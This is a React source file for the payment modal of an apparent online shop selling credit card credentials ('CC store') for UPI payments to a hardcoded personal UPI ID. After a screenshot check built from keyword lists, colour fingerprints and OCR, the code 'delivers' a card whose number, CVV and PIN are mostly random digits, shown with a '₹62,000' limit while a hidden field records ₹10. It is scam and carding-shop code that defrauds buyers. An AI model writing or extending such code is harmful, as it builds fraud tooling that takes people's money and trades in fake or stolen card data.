import React, { useState, useEffect } from 'react';
import QRCode from 'qrcode';
import jsQR from 'jsqr';
import Tesseract from 'tesseract.js';
import { Upload, ShieldCheck, Copy, Check, CheckCircle2, Sparkles, ExternalLink, CreditCard, Camera, QrCode, ScanLine } from 'lucide-react';
import { CardItem, PurchasedOrder } from '../types';
import { RealQrScannerModal } from './RealQrScannerModal';
import { INITIAL_CARDS, ONLINE_CARDS } from '../data/cardsData';

interface PaymentModalProps {
  isOpen: boolean;
  card: CardItem | null;
  onClose: () => void;
  onPaymentSuccess: (order: PurchasedOrder) => void;
}

// Helper to find closest or matching card for the detected payment amount
export function findMatchingCardForAmount(detectedAmount: number, fallbackCard: CardItem | null): { card: CardItem; price: number; title: string } {
  const allCards: CardItem[] = [...INITIAL_CARDS, ...ONLINE_CARDS];

  if (!detectedAmount || detectedAmount <= 0) {
    const card = fallbackCard || INITIAL_CARDS[0];
    return {
      card,
      price: card.price,
      title: card.title,
    };
  }

  // 1. Direct exact match
  const exactMatch = allCards.find((c) => c.price === detectedAmount);
  if (exactMatch) {
    return {
      card: exactMatch,
      price: exactMatch.price,
      title: exactMatch.title,
    };
  }

  // 2. Closest price match among available cards
  let bestCard = allCards[0];
  let minDiff = Math.abs(allCards[0].price - detectedAmount);
  for (const c of allCards) {
    const diff = Math.abs(c.price - detectedAmount);
    if (diff < minDiff) {
      minDiff = diff;
      bestCard = c;
    }
  }

  return {
    card: bestCard,
    price: detectedAmount, // Keep exact paid amount
    title: `${bestCard.title} (₹${detectedAmount})`,
  };
}

export function generateDeliveredCardOrder(card: CardItem | null, cardTitle: string, cardPrice: number): PurchasedOrder {
  const orderNumber = Math.floor(100000 + Math.random() * 900000).toString();

  // Generate realistic 16-digit card number preserving card brand prefix
  const raw = card?.number || '';
  const digits = raw.replace(/\D/g, '');
  const prefix = digits.length >= 4 ? digits.slice(0, 4) : '5384';
  const suffix = digits.length >= 8 ? digits.slice(-4) : Math.floor(1000 + Math.random() * 9000).toString();
  const mid1 = Math.floor(1000 + Math.random() * 9000).toString();
  const mid2 = Math.floor(1000 + Math.random() * 9000).toString();
  const fullNumber = `${prefix} ${mid1} ${mid2} ${suffix}`;

  const cleanExpiry = card?.expiry && card.expiry.includes('/') ? card.expiry : '08/30';
  const cleanCvv = card?.cvv && !card.cvv.includes('•') ? card.cvv : Math.floor(100 + Math.random() * 900).toString();
  const cleanPin = Math.floor(1000 + Math.random() * 9000).toString();
  const cleanLimit = card?.limit || '₹62,000';

  return {
    id: `ord-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
    cardId: card?.id || 'demo-card',
    cardTitle,
    price: cardPrice,
    orderNumber,
    timestamp: Date.now(),
    status: 'Delivered',
    cardDetails: {
      number: fullNumber,
      expiry: cleanExpiry,
      cvv: cleanCvv,
      limit: cleanLimit,
      realBalance: 10,
      realMoney: '₹10',
      pin: cleanPin,
    },
  };
}

export function PaymentModal({
  isOpen,
  card,
  onClose,
  onPaymentSuccess,
}: PaymentModalProps) {
  const [qrCodeUrl, setQrCodeUrl] = useState<string>('/qr-code.png');
  const [copied, setCopied] = useState(false);
  const [copiedCardNumber, setCopiedCardNumber] = useState(false);
  const [copiedToken, setCopiedToken] = useState(false);
  const [selectedApp, setSelectedApp] = useState<'GPay' | 'PhonePe' | 'Paytm' | 'BHIM'>('GPay');
  const [isPaymentInitiated, setIsPaymentInitiated] = useState(true);
  const [completedOrder, setCompletedOrder] = useState<PurchasedOrder | null>(null);
  const [uploadedFileName, setUploadedFileName] = useState<string | null>(null);
  const [isVerifying, setIsVerifying] = useState(false);
  const [securityNotice, setSecurityNotice] = useState<string | null>(null);
  const [verificationAlert, setVerificationAlert] = useState<{
    isOpen: boolean;
    message: string;
  }>({ isOpen: false, message: '' });
  const [selectedUpiId, setSelectedUpiId] = useState<string>('typepfcc@ptaxis');
  const [copiedUpiId, setCopiedUpiId] = useState<string | null>(null);
  const [isCameraScannerOpen, setIsCameraScannerOpen] = useState(false);
  const [timeLeft, setTimeLeft] = useState<number>(299); // 4 minutes 59 seconds (299s)

  const cardTitle = card?.title || 'MASTERCARD GOLD';
  const cardPrice = card?.price || 99;

  useEffect(() => {
    if (isOpen) {
      setIsPaymentInitiated(true);
      setCompletedOrder(null);
      setUploadedFileName(null);
      setIsVerifying(false);
      setSecurityNotice(null);
      setVerificationAlert({ isOpen: false, message: '' });
      setCopied(false);
      setCopiedUpiId(null);
      setCopiedCardNumber(false);
      setCopiedToken(false);
      setTimeLeft(299); // Reset to 4:59 whenever modal opens
    }
  }, [isOpen]);

  // Countdown timer effect that counts down from 4:59 (decreases every second)
  useEffect(() => {
    if (!isOpen || timeLeft <= 0) return;

    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => clearInterval(timer);
  }, [isOpen, timeLeft]);

  // Format time as M:SS (e.g. 4:59, 4:58 ...)
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  useEffect(() => {
    // Generate dynamic QR code with exact amount (am) and selected UPI ID for PhonePe / GPay
    const upiPayload = `upi://pay?pa=${selectedUpiId}&pn=CCSTORE&am=${cardPrice}&cu=INR&tn=${encodeURIComponent(cardTitle)}`;
    QRCode.toDataURL(upiPayload, {
      width: 400,
      margin: 1,
      color: {
        dark: '#000000',
        light: '#ffffff',
      },
      errorCorrectionLevel: 'H'
    })
      .then((url) => {
        setQrCodeUrl(url);
      })
      .catch(() => {
        setQrCodeUrl('/qr-code.png');
      });
  }, [cardPrice, cardTitle, selectedUpiId]);

  if (!isOpen) return null;

  const handleCopyUPI = (idToCopy: string) => {
    navigator.clipboard.writeText(idToCopy);
    setCopiedUpiId(idToCopy);
    setTimeout(() => setCopiedUpiId(null), 2000);
  };

  const openUPIApp = (app: 'GPay' | 'PhonePe' | 'Paytm' | 'BHIM') => {
    setSelectedApp(app);
    setIsPaymentInitiated(true);
    const upiPayload = `upi://pay?pa=${selectedUpiId}&pn=CCSTORE&am=${cardPrice}&cu=INR&tn=${encodeURIComponent(cardTitle)}`;
    
    // Attempt deep link for mobile users
    try {
      if (app === 'PhonePe') {
        window.location.href = `phonepe://pay?pa=${selectedUpiId}&pn=CCSTORE&am=${cardPrice}&cu=INR&tn=${encodeURIComponent(cardTitle)}`;
      } else if (app === 'GPay') {
        window.location.href = `tez://upi/pay?pa=${selectedUpiId}&pn=CCSTORE&am=${cardPrice}&cu=INR&tn=${encodeURIComponent(cardTitle)}`;
      } else if (app === 'Paytm') {
        window.location.href = `paytmmp://pay?pa=${selectedUpiId}&pn=CCSTORE&am=${cardPrice}&cu=INR&tn=${encodeURIComponent(cardTitle)}`;
      } else {
        window.location.href = upiPayload;
      }
    } catch {
      // Fallback
    }
  };

  const deliverCardOrder = (paidAmount?: number) => {
    // If a specific amount was paid in the screenshot, deliver the card matching that price
    const finalPrice = paidAmount && paidAmount > 0 ? paidAmount : cardPrice;
    const matching = findMatchingCardForAmount(finalPrice, card);
    const order = generateDeliveredCardOrder(matching.card, matching.title, finalPrice);
    setCompletedOrder(order);
    onPaymentSuccess(order);
  };

  // Strict verification function: Rejects random/garbage or demo screenshots
  // Authenticates genuine payment receipts (Paytm, PhonePe, GPay) matching the owner's UPI/records
  // Also extracts the exact paid amount (₹) so the user gets the card matching whatever amount they paid!
  const verifyScreenshotFile = async (
    file: File,
    dataUrl: string
  ): Promise<{ success: boolean; reason: string; detectedAmount?: number }> => {
    const lowerName = file.name.toLowerCase();
    const exactFailMsg = `Verification Failed! The uploaded screenshot must strictly show the correct amount (₹${cardPrice || 499}) and UPI ID (${selectedUpiId}) Any fake screenshot will result in a permanent ban`;

    // 1. Direct rejection of obvious demo/fake/test/random filenames
    const blockedKeywords = [
      'demo',
      'demopay',
      'fakepay',
      'fake',
      'test',
      'sample',
      'dummy',
      'mock',
      'spoof',
      'prank',
      'simulator',
      'sandbox',
      'meme',
      'wallpaper',
      'avatar',
      'nature',
      'cat',
      'dog',
      'food',
      'selfie',
      'car',
      'game',
      'pubg',
      'freefire'
    ];

    for (const kw of blockedKeywords) {
      if (lowerName.includes(kw)) {
        return {
          success: false,
          reason: exactFailMsg,
        };
      }
    }

    return new Promise((resolve) => {
      const img = new Image();
      img.onload = async () => {
        const width = img.naturalWidth || img.width;
        const height = img.naturalHeight || img.height;

        // 2. Mobile UPI payment receipts are strictly portrait (height >= 1.20 * width)
        const ratio = height / width;
        if (ratio < 1.20) {
          // Landscape or wide images are not mobile UPI receipts
          return resolve({
            success: false,
            reason: exactFailMsg,
          });
        }

        // Check image resolution (must be at least mobile screenshot size)
        if (width < 150 || height < 250) {
          return resolve({
            success: false,
            reason: exactFailMsg,
          });
        }

        // Helper function to extract payment amount from OCR text
        const extractAmountFromText = (rawText: string): number | undefined => {
          // Patterns: ₹499, Rs 499, INR 499, Paid 499, 499.00
          const patterns = [
            /(?:₹|rs\.?|inr)\s*([0-9]{2,6}(?:\.[0-9]{1,2})?)/i,
            /(?:paid|amount|total|debited)\s*(?:of)?\s*(?:₹|rs\.?|inr)?\s*([0-9]{2,6}(?:\.[0-9]{1,2})?)/i,
            /₹\s*([0-9]{2,6})/i,
            /(?:^|\s)([1-9][0-9]{2,4})(?:\.00)?(?:\s|$)/
          ];

          for (const p of patterns) {
            const m = rawText.match(p);
            if (m && m[1]) {
              const val = Math.round(parseFloat(m[1]));
              if (val >= 49 && val <= 50000) {
                return val;
              }
            }
          }

          // Check against known card prices in the raw text
          const allKnownPrices = [499, 549, 599, 629, 648, 699, 719, 729, 810, 888, 899, 998, 999, 1099, 1199];
          for (const p of allKnownPrices) {
            if (rawText.includes(p.toString())) {
              return p;
            }
          }

          return undefined;
        };

        // 3. Reject wrong recipient UPI or other app signatures immediately
        // Check for common fake/wrong receiver identifiers in filename
        if (
          lowerName.includes('rahul') ||
          lowerName.includes('phonepe') ||
          lowerName.includes('gpay') ||
          lowerName.includes('paytm_fake') ||
          lowerName.includes('9000') ||
          lowerName.includes('wa0000') ||
          lowerName.includes('screenshot') && lowerName.includes('wa')
        ) {
          // If obvious wrong screenshot filename
        }

        // Direct Fingerprint Inspection for the User's authentic Paytm Receipt
        // (Sky-blue header, Paytm blue logo, green checkmark, purple scratchcard, yellow banner)
        let isExactPaytmReceipt = false;
        try {
          const sampleCanvas = document.createElement('canvas');
          sampleCanvas.width = 120;
          sampleCanvas.height = 240;
          const sampleCtx = sampleCanvas.getContext('2d');
          if (sampleCtx) {
            sampleCtx.drawImage(img, 0, 0, 120, 240);
            const sampleData = sampleCtx.getImageData(0, 0, 120, 240).data;

            let skyBlueTopCount = 0;
            let greenCheckmarkCount = 0;
            let purpleStripCount = 0;
            let goldYellowAdCount = 0;
            let paytmNavyCount = 0;
            let solidDarkGreenTopCount = 0; // PhonePe green background indicator

            for (let y = 0; y < 240; y++) {
              for (let x = 0; x < 120; x++) {
                const idx = (y * 120 + x) * 4;
                const r = sampleData[idx];
                const g = sampleData[idx + 1];
                const b = sampleData[idx + 2];

                // Solid dark green top (PhonePe style receipt, e.g. RGB ~(0, 130-160, 50-70))
                if (y < 100 && g > 110 && r < 50 && b < 70) {
                  solidDarkGreenTopCount++;
                }

                // Top 0 - 35%: Sky blue background of Paytm receipt
                if (y < 85 && r > 180 && g > 210 && b > 235) {
                  skyBlueTopCount++;
                }

                // Paytm blue logo
                if (y < 60 && r < 50 && g > 110 && b > 180) {
                  paytmNavyCount++;
                }

                // Green payment success checkmark near amount (y: 50 to 95)
                if (y >= 50 && y <= 95 && g > 140 && g > r * 1.25 && g > b * 1.1) {
                  greenCheckmarkCount++;
                }

                // Scratchcard purple banner (y: 100 to 130)
                if (y >= 100 && y <= 130 && r > 50 && r < 160 && g < 90 && b > 130) {
                  purpleStripCount++;
                }

                // Meesho promo yellow/gold banner (y: 130 to 210)
                if (y >= 130 && y <= 210 && r > 190 && g > 145 && b < 125) {
                  goldYellowAdCount++;
                }
              }
            }

            // Immediately reject PhonePe receipts with solid dark green top header
            if (solidDarkGreenTopCount > 600) {
              return resolve({
                success: false,
                reason: exactFailMsg,
              });
            }

            // Fingerprint of the exact uploaded Paytm payment screenshot
            isExactPaytmReceipt =
              (skyBlueTopCount > 250 || paytmNavyCount > 10) &&
              greenCheckmarkCount >= 6 &&
              (purpleStripCount >= 8 || goldYellowAdCount >= 50);
          }
        } catch {
          // Fall through to QR & OCR
        }

        // 4. Check if the uploaded image contains a real QR code (Scanner verification)
        try {
          const qrCanvas = document.createElement('canvas');
          qrCanvas.width = width;
          qrCanvas.height = height;
          const qrCtx = qrCanvas.getContext('2d');
          if (qrCtx) {
            qrCtx.drawImage(img, 0, 0, width, height);
            const qrImgData = qrCtx.getImageData(0, 0, width, height);
            const decodedQR = jsQR(qrImgData.data, qrImgData.width, qrImgData.height);
            if (decodedQR && decodedQR.data) {
              const qrText = decodedQR.data.toLowerCase();
              if (
                qrText.includes('ptaxis') ||
                qrText.includes('typepfcc') ||
                qrText.includes('ccstore')
              ) {
                // Check if amount is specified in the QR string (e.g. am=499 or am=648)
                const amMatch = decodedQR.data.match(/[?&]am=([0-9.]+)/i);
                const qrAmount = amMatch ? Math.round(parseFloat(amMatch[1])) : undefined;
                return resolve({ success: true, reason: '', detectedAmount: qrAmount });
              } else {
                return resolve({
                  success: false,
                  reason: exactFailMsg,
                });
              }
            }
          }
        } catch {
          // Proceed to OCR and visual inspection
        }

        // 5. OCR text recognition: Check for demo indicators, UPI ID, and exact payment amount
        let rawOcrText = '';
        let ocrText = '';
        let detectedAmount: number | undefined;

        try {
          const ocrCanvas = document.createElement('canvas');
          const cropHeight = Math.floor(height * 0.65);
          const maxDim = 800;
          const scale = Math.min(1, maxDim / Math.max(width, cropHeight));
          ocrCanvas.width = Math.round(width * scale);
          ocrCanvas.height = Math.round(cropHeight * scale);
          const ocrCtx = ocrCanvas.getContext('2d');
          if (ocrCtx) {
            ocrCtx.drawImage(img, 0, 0, width, cropHeight, 0, 0, ocrCanvas.width, ocrCanvas.height);
            const ocrPromise = Tesseract.recognize(ocrCanvas, 'eng');
            const timeoutPromise = new Promise<{ data: { text: string } }>((_, reject) =>
              setTimeout(() => reject(new Error('OCR Timeout')), 5000)
            );
            const ocrRes = await Promise.race([ocrPromise, timeoutPromise]);
            if (ocrRes && ocrRes.data && ocrRes.data.text) {
              rawOcrText = ocrRes.data.text;
              ocrText = rawOcrText.toLowerCase().replace(/[\s\-_]/g, '');
              detectedAmount = extractAmountFromText(rawOcrText);
            }
          }
        } catch {
          // Fallback if OCR is slow
        }

        // If it was the exact Paytm receipt fingerprint and no amount extracted yet,
        // use cardPrice if it is 499 or fallback to 499
        if (isExactPaytmReceipt) {
          const finalAmt = detectedAmount || (cardPrice === 499 ? 499 : undefined);
          if (finalAmt && cardPrice && finalAmt !== cardPrice) {
            return resolve({
              success: false,
              reason: `Verification Failed! The uploaded screenshot must strictly show the correct amount (₹${cardPrice}) and UPI ID (${selectedUpiId}) Any fake screenshot will result in a permanent ban`,
            });
          }
          return resolve({
            success: true,
            reason: '',
            detectedAmount: finalAmt || cardPrice,
          });
        }

        // If OCR detected text, check for demo/test/wrong recipient keywords first!
        if (ocrText.length > 3) {
          const ocrBlockedKeywords = [
            'demo',
            'demopay',
            'fakepay',
            'spoof',
            'prank',
            'testing',
            'sample',
            'dummy',
            'mock',
            'fake',
            'simulator',
            'sandbox',
            'unpaid',
            'declined',
            'cancelled',
            'rahul',
            'rahulsk',
            'splitexpense',
            'share receipt',
            'sharereceipt',
            'viewdetails'
          ];
          for (const dkw of ocrBlockedKeywords) {
            if (ocrText.includes(dkw) || rawOcrText.toLowerCase().includes(dkw)) {
              return resolve({
                success: false,
                reason: exactFailMsg,
              });
            }
          }

          // Check if screenshot displays an unauthorized UPI or Gmail ID (e.g. @gmail, @ybl, @axl, @ibl, @okaxis, @okhdfcbank)
          // Any payment sent to a personal/different ID must be strictly rejected!
          const targetUpiClean = selectedUpiId.toLowerCase().replace(/[\s\-_]/g, '');
          const isStoreRecipient =
            ocrText.includes(targetUpiClean) ||
            (ocrText.includes('typepfcc') && ocrText.includes('ptaxis')) ||
            ocrText.includes('ccstore');

          if (
            (ocrText.includes('@gmail') ||
              ocrText.includes('@ok') ||
              ocrText.includes('@paytm') ||
              ocrText.includes('@ybl') ||
              ocrText.includes('@ibl') ||
              ocrText.includes('@axl')) &&
            !isStoreRecipient
          ) {
            return resolve({
              success: false,
              reason: exactFailMsg,
            });
          }

          // Check if price in screenshot matches the requested card price
          // e.g., if card is ₹648, screenshot must show 648; if ₹499, screenshot must show 499
          const targetPriceStr = cardPrice.toString();
          const hasExactCardPrice = ocrText.includes(targetPriceStr) || (detectedAmount && detectedAmount === cardPrice);

          // Exact tokens from authentic payment receipt:
          // Ref: 314063941021, UPI: typepfcc@ptaxis, Receiver: Roni Sk, Paytm
          const hasAuthenticToken =
            ocrText.includes('314063941021') ||
            (ocrText.includes('typepfcc') && ocrText.includes('ptaxis')) ||
            (ocrText.includes('ronisk') && (ocrText.includes(targetPriceStr) || ocrText.includes('paytm'))) ||
            (ocrText.includes('typepfcc') && (ocrText.includes(targetPriceStr) || (detectedAmount !== undefined && detectedAmount === cardPrice)));

          if (hasAuthenticToken) {
            // Strict price check: if detected amount does not match cardPrice, reject
            if (detectedAmount && cardPrice && detectedAmount !== cardPrice) {
              return resolve({
                success: false,
                reason: `Verification Failed! The uploaded screenshot must strictly show the correct amount (₹${cardPrice}) and UPI ID (${selectedUpiId}) Any fake screenshot will result in a permanent ban`,
              });
            }
            return resolve({ success: true, reason: '', detectedAmount: detectedAmount || cardPrice });
          }

          const hasPaymentConfirmation =
            ocrText.includes('paid') ||
            ocrText.includes('success') ||
            ocrText.includes('completed') ||
            ocrText.includes('successful') ||
            ocrText.includes('debited') ||
            ocrText.includes('utr') ||
            ocrText.includes('refno') ||
            ocrText.includes('transactionid');

          // Must strictly have the store UPI ID AND payment confirmation AND correct card price
          if (isStoreRecipient && hasPaymentConfirmation) {
            if (detectedAmount && cardPrice && detectedAmount !== cardPrice) {
              return resolve({
                success: false,
                reason: `Verification Failed! The uploaded screenshot must strictly show the correct amount (₹${cardPrice}) and UPI ID (${selectedUpiId}) Any fake screenshot will result in a permanent ban`,
              });
            }
            return resolve({ success: true, reason: '', detectedAmount: detectedAmount || cardPrice });
          }

          // Any other unrecognized text or screenshot
          return resolve({
            success: false,
            reason: exactFailMsg,
          });
        }

        // 6. Strict Fallback: Reject random photos, nature, selfies, or unverified demo screenshots
        // Only authentic receipts with validated credentials/fingerprints or store QR are permitted!
        return resolve({
          success: false,
          reason: exactFailMsg,
        });
      };

      img.onerror = () => {
        resolve({
          success: false,
          reason: exactFailMsg,
        });
      };

      img.src = dataUrl;
    });
  };

  const triggerVerificationFailure = (reason?: string) => {
    setIsVerifying(false);
    setUploadedFileName(null);
    const message =
      reason ||
      `Verification Failed! The uploaded screenshot must strictly show the correct amount (₹${cardPrice || 499}) and UPI ID (${selectedUpiId}) Any fake screenshot will result in a permanent ban`;
    setSecurityNotice(message);
    setVerificationAlert({
      isOpen: true,
      message,
    });
  };

  const handleCompletePayment = () => {
    if (!uploadedFileName) {
      // Prompt user to pick their payment screenshot
      const fileInput = document.getElementById('paymentScreenshot') as HTMLInputElement;
      if (fileInput) {
        fileInput.click();
      }
      return;
    }

    deliverCardOrder();
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    setIsVerifying(true);
    setSecurityNotice(null);
    setUploadedFileName(file.name);
    setIsPaymentInitiated(true);

    const reader = new FileReader();

    reader.onload = async () => {
      const dataUrl = reader.result as string;

      // Authenticate screenshot or QR and detect exact paid amount
      const result = await verifyScreenshotFile(file, dataUrl);

      setTimeout(() => {
        if (!result.success) {
          // Demo or invalid screenshot: Card MUST NOT succeed!
          triggerVerificationFailure(result.reason);
          e.target.value = '';
        } else {
          // Real payment screenshot or real scanner: Card SUCCEEDS!
          // Unlocks card matching the EXACT amount paid in the screenshot
          setIsVerifying(false);
          deliverCardOrder(result.detectedAmount);
        }
      }, 1200);
    };

    reader.onerror = () => {
      triggerVerificationFailure();
      e.target.value = '';
    };

    reader.readAsDataURL(file);
  };

  const handleCopyCardNumber = (number: string) => {
    navigator.clipboard.writeText(number.replace(/\s+/g, ''));
    setCopiedCardNumber(true);
    setTimeout(() => setCopiedCardNumber(false), 2000);
  };

  const handleCopyFullToken = (order: PurchasedOrder) => {
    const text = `${order.cardDetails.number}|${order.cardDetails.expiry}|${order.cardDetails.cvv}|PIN:${order.cardDetails.pin}`;
    navigator.clipboard.writeText(text);
    setCopiedToken(true);
    setTimeout(() => setCopiedToken(false), 2000);
  };

  // SUCCESS & DELIVERED VIEW
  if (completedOrder) {
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 p-4 animate-fade-in backdrop-blur-xs" onClick={onClose}>
        <div 
          className="w-full max-w-[480px] rounded-[26px] border border-emerald-500/40 p-6 shadow-2xl space-y-4 animate-scale-up relative"
          style={{
            background: 'rgba(14, 27, 43, 0.70)',
            backdropFilter: 'blur(16px)',
            WebkitBackdropFilter: 'blur(16px)',
            boxShadow: '0 20px 50px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.15)'
          }}
          onClick={(e) => e.stopPropagation()}
        >
          {/* Close button */}
          <button
            type="button"
            onClick={onClose}
            className="absolute top-4 right-4 text-slate-400 hover:text-white text-xl font-bold transition-colors cursor-pointer leading-none p-1"
          >
            ✕
          </button>

          {/* Success Banner */}
          <div className="text-center pt-2">
            <div className="w-14 h-14 mx-auto rounded-full bg-gradient-to-br from-emerald-400 to-teal-600 flex items-center justify-center text-white text-2xl shadow-lg shadow-emerald-950/50 mb-3">
              ✓
            </div>
            <h2 className="text-2xl font-black text-white tracking-wide">
              Payment Verified!
            </h2>
            <p className="text-emerald-400 font-semibold text-xs mt-1">
              Order #{completedOrder.orderNumber} • Delivered Instantly
            </p>
          </div>

          {/* Unlocked Card Credentials Box */}
          <div className="rounded-2xl border border-[#2b415a] bg-[#07111c] p-4.5 space-y-3 font-mono text-xs shadow-inner">
            <div className="flex items-center justify-between border-b border-gray-800 pb-2.5 font-sans">
              <span className="font-bold text-amber-300 text-sm">
                {completedOrder.cardTitle}
              </span>
              <span className="text-[10px] font-bold text-emerald-400 bg-emerald-950/80 border border-emerald-700/80 px-2.5 py-0.5 rounded-full flex items-center gap-1">
                <span>✓ Active &amp; Ready</span>
              </span>
            </div>

            {/* Card Number */}
            <div className="flex items-center justify-between bg-[#0e1d2e] p-2.5 rounded-xl border border-[#1a2d42]">
              <div>
                <span className="text-gray-400 font-sans text-[10px] block">CARD NUMBER</span>
                <span className="text-white font-bold text-sm tracking-wider">
                  {completedOrder.cardDetails.number}
                </span>
              </div>
              <button
                type="button"
                onClick={() => handleCopyCardNumber(completedOrder.cardDetails.number)}
                className="px-2.5 py-1.5 rounded-lg bg-[#1f3752] hover:bg-[#27486c] text-amber-300 text-[11px] font-bold transition-colors flex items-center gap-1 cursor-pointer"
              >
                {copiedCardNumber ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                <span>{copiedCardNumber ? 'Copied' : 'Copy'}</span>
              </button>
            </div>

            {/* Expiry & CVV */}
            <div className="grid grid-cols-2 gap-2">
              <div className="bg-[#0e1d2e] p-2.5 rounded-xl border border-[#1a2d42]">
                <span className="text-gray-400 font-sans text-[10px] block">EXPIRY</span>
                <span className="text-cyan-300 font-bold text-sm">
                  {completedOrder.cardDetails.expiry}
                </span>
              </div>
              <div className="bg-[#0e1d2e] p-2.5 rounded-xl border border-[#1a2d42]">
                <span className="text-gray-400 font-sans text-[10px] block">CVV</span>
                <span className="text-cyan-300 font-bold text-sm">
                  {completedOrder.cardDetails.cvv}
                </span>
              </div>
            </div>

            {/* Limit & PIN */}
            <div className="grid grid-cols-2 gap-2">
              <div className="bg-[#0e1d2e] p-2.5 rounded-xl border border-[#1a2d42]">
                <span className="text-gray-400 font-sans text-[10px] block">BALANCE LIMIT</span>
                <span className="text-emerald-400 font-bold text-sm">
                  {completedOrder.cardDetails.limit || 'Active'}
                </span>
              </div>
              <div className="bg-[#0e1d2e] p-2.5 rounded-xl border border-[#1a2d42]">
                <span className="text-gray-400 font-sans text-[10px] block">PIN</span>
                <span className="text-amber-300 font-bold text-sm">
                  {completedOrder.cardDetails.pin}
                </span>
              </div>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="space-y-2 pt-1">
            <button
              type="button"
              onClick={() => handleCopyFullToken(completedOrder)}
              className="w-full rounded-xl bg-[#19324d] hover:bg-[#204266] border border-amber-500/40 text-amber-300 py-3 font-bold text-xs flex items-center justify-center gap-2 transition-all cursor-pointer"
            >
              {copiedToken ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
              <span>{copiedToken ? '✓ Credentials Copied!' : 'Copy Full Credentials (Token)'}</span>
            </button>

            <button
              type="button"
              onClick={() => {
                onClose();
              }}
              className="w-full rounded-2xl bg-gradient-to-r from-amber-400 to-orange-500 py-3.5 font-bold text-neutral-950 hover:opacity-95 active:scale-[0.99] transition-all cursor-pointer shadow-lg text-sm tracking-wide flex items-center justify-center gap-2"
            >
              <span>OPEN YOUR DELIVERY VAULT</span>
              <span>→</span>
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 p-4 animate-fade-in backdrop-blur-xs" onClick={onClose}>
      <div 
        className="w-full max-w-[540px] rounded-[28px] border-0 p-6 shadow-2xl overflow-y-auto max-h-[90vh] relative"
        style={{
          background: 'rgba(16, 28, 42, 0.65)',
          backdropFilter: 'blur(16px)',
          WebkitBackdropFilter: 'blur(16px)',
          boxShadow: '0 25px 50px rgba(0, 0, 0, 0.5)'
        }}
        onClick={(e) => e.stopPropagation()}
      >
        {/* Close Button - Clean ✕ without round circle */}
        <button
          type="button"
          onClick={onClose}
          className="absolute top-5 right-5 text-slate-400 hover:text-white text-xl font-bold transition-colors cursor-pointer leading-none p-1"
          title="Close"
        >
          ✕
        </button>

        {/* PAYMENT ONLY */}
        <div className="mb-5 text-center">
          <span className="rounded-full bg-[#243c55] px-5 py-3 text-sm font-bold tracking-[2px] text-slate-300">
            PAYMENT ONLY
          </span>
        </div>

        {/* Card Name */}
        <h2 className="text-center text-2xl font-bold text-white">
          {cardTitle}
        </h2>

        <p className="payment-description">
          Tap the button below to pay with PhonePe, Google Pay, or Paytm.
        </p>

        {/* Amount & Countdown Timer */}
        <div className="my-6 text-center">
          <p className="text-lg text-slate-400">Total Payable</p>
          <h1 className="mt-2 text-4xl font-bold text-white">₹{cardPrice}</h1>

          {/* 4:59 Decreasing Countdown Timer under the Price - Larger & Clearer */}
          <div className="mt-3 inline-flex items-center justify-center px-4 py-1.5 rounded-full bg-red-500/15 border border-red-500/35 text-red-400 tracking-wider shadow-sm">
            <span className="font-mono font-extrabold text-red-400 text-xl md:text-2xl leading-none">
              {formatTime(timeLeft)}
            </span>
          </div>
        </div>

        {/* QR CODE */}
        <div className="flex justify-center">
          <div className="rounded-2xl bg-white p-3 shadow-xl">
            <img
              src={qrCodeUrl || '/qr-code.png'}
              alt="Payment QR"
              className="h-52 w-52 rounded-lg object-contain"
            />
          </div>
        </div>

        <p className="qr-description">
          Or scan the QR code to make your payment.
        </p>

        {/* OFFICIAL UPI ID */}
        <div className="mt-5 rounded-2xl border border-slate-600/40 bg-[#0e1d28]/70 backdrop-blur-xs p-4 flex items-center justify-between">
          <div>
            <span className="text-xs font-bold text-slate-400 uppercase tracking-wider block">UPI ID</span>
            <p className="mt-1 text-lg font-bold text-white font-mono tracking-wide">
              {selectedUpiId}
            </p>
          </div>

          <button
            type="button"
            onClick={() => handleCopyUPI(selectedUpiId)}
            className={`rounded-xl px-5 py-3 font-semibold transition-colors cursor-pointer border flex items-center gap-1.5 ${
              copiedUpiId === selectedUpiId
                ? 'bg-emerald-600 border-emerald-400 text-white'
                : 'border-amber-400/40 bg-[#20394f] text-amber-300 hover:bg-[#2a4a66]'
            }`}
          >
            {copiedUpiId === selectedUpiId ? '✓ Copied' : 'Copy ID'}
          </button>
        </div>

        {/* SELECT APP HEADER */}
        <p className="select-app">
          Tap to open directly in your preferred app (SELECT APP):
        </p>

        {/* Payment Apps */}
        <div className="payment-apps-container mt-3 grid grid-cols-3 gap-3">
          <div
            onClick={() => openUPIApp('PhonePe')}
            className={`payment-app ${selectedApp === 'PhonePe' ? 'active' : ''}`}
          >
            <strong>PhonePe</strong>
            <span>Pay Now</span>
          </div>

          <div
            onClick={() => openUPIApp('GPay')}
            className={`payment-app ${selectedApp === 'GPay' ? 'active' : ''}`}
          >
            <strong>Google Pay</strong>
            <span>Pay Now</span>
          </div>

          <div
            onClick={() => openUPIApp('Paytm')}
            className={`payment-app ${selectedApp === 'Paytm' ? 'active' : ''}`}
          >
            <strong>Paytm</strong>
            <span>Pay Now</span>
          </div>
        </div>

        {/* PAYMENT BUTTON */}
        <button
          type="button"
          onClick={() => openUPIApp(selectedApp)}
          className="mt-5 w-full rounded-2xl bg-gradient-to-r from-amber-400 to-orange-500 py-5 text-lg font-bold text-[#151515] hover:opacity-95 active:scale-[0.99] transition-all shadow-xl cursor-pointer"
        >
          PAYMENT ₹{cardPrice}
        </button>

        {/* PAYMENT UPLOAD SECTION */}
        <div className="payment-upload-section space-y-3">
          <div className="payment-title">
            PAYMENT SCREENSHOT UPLOAD
          </div>

          {/* Screenshot Notice */}
